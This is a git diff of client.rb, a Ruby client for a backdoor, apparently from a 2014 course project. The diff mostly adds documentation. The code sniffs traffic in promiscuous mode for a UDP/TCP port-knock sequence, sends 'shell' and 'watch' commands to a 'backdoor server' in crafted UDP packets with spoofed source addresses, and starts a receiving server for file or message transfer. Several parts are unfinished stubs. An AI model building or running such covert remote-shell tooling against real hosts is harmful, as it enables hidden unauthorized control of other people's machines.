@@ -1,14 +1,22 @@
 #!/usr/bin/env ruby
 =begin
 -------------------------------------------------------------------------------------
--- SOURCE FILE:   client.rb - description goes here
+-- SOURCE FILE:   client.rb - Client to send commands covertly to server. Also,
+--                            awaits covert knock sequence from the server to 
+--                            open TCP/UDP communication for receiving of files
+--                            or messages.
 --
 -- PROGRAM:       client
 --                ./client.rb
 --
--- FUNCTIONS:     stuff here
+-- FUNCTIONS:     libpcap packet sniffing, encryption, decryption, packet crafting,
+--                covert channels, remote shell, file transfer, port knocking, 
+--                shell-like input, regular expressions, file I/O
 --
--- Ruby Gems req: 
+-- Ruby Gems req: packetfu
+--                https://rubygems.org/gems/packetfu
+--                fssm
+--                https://rubygems.org/gems/fssm
 -- 
 -- DATE:          May/June 2014
 --
@@ -18,7 +26,10 @@
 --
 -- PROGRAMMERS:   Chris Wood - chriswood.ca@gmail.com
 -- 
--- NOTES:         notes might go here
+-- NOTES:         ** has the weird buffer issue just like the server, no idea what 
+--                causes it, server needs to send multiple crafted packets before they
+--                are received here
+--                ** TODO: all tcp implementations
 ---------------------------------------------------------------------------------------
 =end
 
@@ -48,6 +59,10 @@ INPUT_REGEX = /^(shell|watch) .+$/
 
 ## Functions
 
+# Starts the packet sniffing function for the client.
+# Wait for the knock pattern and when received,
+# starts receiving server. Knock pattern reset after.
+# Implemented protocols: TCP, UDP
 def listen_for_knock
   puts "starting silent listen for knock\n>"
   filter = "udp or tcp"
@@ -56,14 +71,13 @@ def listen_for_knock
         :start => true,
         :promic => true,
         :filter => filter)
-      k1, k2, k3 = false, false, false
-      k4, k5, k6 = false, false, false
-      config = nil
+      k1, k2, k3 = false, false, false #udp knock pattern flags
+      k4, k5, k6 = false, false, false #tcp knock pattern flags
+      config = nil #information on recv server configuration
       cap.stream.each do |p|
         pkt =  PacketFu::Packet.parse(p)
         if PacketFu::UDPPacket.can_parse?(p)
           #UDP
-          puts "udp: #{pkt.udp_dst}"
           if pkt.udp_dst == 44444
             k1 = true
           elsif pkt.udp_dst == 55555
@@ -76,54 +90,60 @@ def listen_for_knock
           #TCP
           #puts "tcp: #{pkt.tcp_dst}"
         else
-          #not implemented
+          #not implemented: other protocol sniffing
         end
         if k1 && k2 && k3
-          puts "knock recv"
+          puts "knock recv (udp)"
           k1, k2, k3 = false, false, false
           start_receiving_server(config)
         elsif k4 && k5 && k6
-          puts "knock recv"
+          puts "knock recv (tcp)"
           k4, k5, k6 = false, false, false
           start_receiving_server(config)
         else
-          #not implemented
+          #not implemented: other protocol knocks
         end
       end
     rescue Exception => e
       puts "error in pkt capture"
     end
-
-    puts "bottom"
 end
 
+# Starts the receiving server to read messages 
+# or receive files from the backdoor server.
+# Implemented protocols: TCP, UDP
+# @param [String] confing
+# - csv of the configuration for the recv server
+#   such as ttl, protocol, port to run on.
 def start_receiving_server(config)
   cfg_items = config.split(',')
   if cfg_items[0] == UDP
     recv_thread = Thread.new {
-      puts "server started"
+      puts "recv server started (udp)"
       socket = UDPSocket.new
       socket.bind('0.0.0.0', cfg_items[1].to_i)
       max_time = cfg_items[2].to_i
       timer = Thread.new {sleep max_time}
       payload = nil
       loop {
-        if timer.status == false #thread has completed
+        if timer.status == false #ttl has completed
           break
         end
         #check size for recv
         #payload += decrpyt(socket.recv(1024))
       }
-      puts "server ending"
+      puts "recv server ending (udp)"
     }
   elsif cfg_items[0] == TCP
     #coming
     puts TCP
   else
-    #not implemented
+    #not implemented: other protocol receiving servers
   end
 end
 
+# Command loop for client to communcation to backdoor server.
+# Two options: shell or watch
 def start_command_loop
   puts "+ enter a command (2 options)"
   puts "+ shell (cmd)"
@@ -139,6 +159,11 @@ def start_command_loop
   }
 end
 
+# Validates proper packet payload and directs to coresponding
+# packet creation function.
+# Implemented protocols: TCP, UDP
+# @param [String] command
+# - command to wrap in payload
 def send_pkt_server_async(command)
   if $cfg_pen_protocol == TCP
     # handle TCP here
@@ -152,6 +177,13 @@ def send_pkt_server_async(command)
   end
 end
 
+# Crafts UDP packet aimed to the values from the configuration file
+# dst port = pen_port
+# ip_daddr = target_ip
+# src_port and ip_saddr are not important so they can be spoofed.
+# Packet is then placed on the configured interface.
+# @params [String] payload
+# - data to send in the UDP packet
 def udp_packet(payload)
   config = PacketFu::Config.new(PacketFu::Utils.whoami?(:iface=> $cfg_iface)).config
   udp_pkt = PacketFu::UDPPacket.new(:config => config, :flavor => "Linux")
@@ -170,9 +202,8 @@ def udp_packet(payload)
 end
 
 ## Main
-
 load_config_file
-validate_target_ip($cfg_target_ip)
+validate_ip($cfg_target_ip)
 puts "+ Welcome to \"not a hacking\" program"
 begin
   listening_thread = Thread.new { listen_for_knock }
